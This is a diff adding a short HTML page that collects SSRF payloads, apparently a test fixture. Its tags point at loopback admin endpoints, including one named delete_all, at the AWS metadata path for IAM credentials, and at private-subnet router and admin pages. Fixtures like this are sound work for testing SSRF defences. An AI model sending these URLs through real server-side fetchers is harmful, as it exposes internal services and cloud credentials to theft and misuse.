@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SSRF Internal IP & Cloud Metadata Attack Vectors</title>
+</head>
+<body>
+    <h1>SSRF & Internal Network Access Vectors</h1>
+
+    <!-- 1. Localhost and Loopback IP Access -->
+    <img src="http://127.0.0.1:8080/admin/delete_all" alt="Localhost IPv4">
+    <img src="http://[::1]:8080/internal_api" alt="Localhost IPv6">
+    <img src="http://localhost:3000/internal_service" alt="Localhost Domain">
+    <img src="http://0.0.0.0:8000/status" alt="Zero IP">
+
+    <!-- 2. AWS / Cloud Metadata Service (IMDSv1) -->
+    <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
+
+    <!-- 3. Private RFC1918 Subnets -->
+    <a href="http://10.0.0.1/router_login">Private Class A Subnet</a>
+    <a href="http://172.16.0.1/admin">Private Class B Subnet</a>
+    <a href="http://192.168.1.1/config">Private Class C Subnet</a>
+</body>
+</html>
